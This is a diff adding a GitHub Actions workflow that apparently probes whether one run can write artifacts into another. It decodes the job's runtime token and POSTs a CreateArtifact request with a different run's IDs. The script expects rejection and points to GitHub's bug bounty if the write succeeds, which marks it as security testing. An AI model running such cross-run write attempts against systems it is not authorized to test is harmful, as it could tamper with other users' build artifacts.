@@ -1,0 +1,62 @@
+name: 'job A'
+# Runs SECOND
+on:
+  workflow_dispatch:
+    inputs:
+      target_run_backend_id:
+        description: " workflowRunBackendId (from job-b.yml output)"
+        required: true
+      target_job_backend_id:
+        description: " workflowJobRunBackendId (from job-b.yml output)"
+        required: true
+
+jobs:
+  attempt-cross-run-write:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show this run's own backend IDs, for contrast
+        env:
+          ACTIONS_RUNTIME_TOKEN: ${{ env.ACTIONS_RUNTIME_TOKEN }}
+        run: |
+          node -e "
+            const jwt = process.env.ACTIONS_RUNTIME_TOKEN;
+            const payload = JSON.parse(Buffer.from(jwt.split('.')[1], 'base64url').toString());
+            const scope = payload.scp.split(' ').find(s => s.startsWith('Actions.Results:'));
+            const [, workflowRunBackendId, workflowJobRunBackendId] = scope.split(':');
+            console.log('This run\'s own workflowRunBackendId:    ' + workflowRunBackendId);
+            console.log('This run\'s own workflowJobRunBackendId: ' + workflowJobRunBackendId);
+          "
+
+      - name: Attempt CreateArtifact with job B's IDs, authenticated as job A
+        env:
+          ACTIONS_RUNTIME_TOKEN: ${{ env.ACTIONS_RUNTIME_TOKEN }}
+          ACTIONS_RESULTS_URL: ${{ env.ACTIONS_RESULTS_URL }}
+          TARGET_RUN_ID: ${{ inputs.target_run_backend_id }}
+          TARGET_JOB_ID: ${{ inputs.target_job_backend_id }}
+        run: |
+          BODY=$(node -e "
+            console.log(JSON.stringify({
+              workflowRunBackendId: process.env.TARGET_RUN_ID,
+              workflowJobRunBackendId: process.env.TARGET_JOB_ID,
+              name: 'cross-run-write-poc',
+              version: 7
+            }))
+          ")
+
+          HTTP_STATUS=$(curl -s -o response.json -w '%{http_code}' \
+            -X POST \
+            -H "Authorization: Bearer ${ACTIONS_RUNTIME_TOKEN}" \
+            -H 'Content-Type: application/json' \
+            -d "${BODY}" \
+            "${ACTIONS_RESULTS_URL%/}/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact")
+
+          echo "HTTP status: ${HTTP_STATUS}"
+          echo "Response body:"
+          cat response.json
+          echo ""
+
+          if [ "${HTTP_STATUS}" -ge 200 ] && [ "${HTTP_STATUS}" -lt 300 ]; then
+            echo "::warning::Cross-run write appears to have SUCCEEDED. Do not proceed further — report to GitHub's Security Bug Bounty (bounty.github.com) instead of investigating alone."
+          else
+            echo "Cross-run write was rejected, as expected. Isolation held."
+          fi
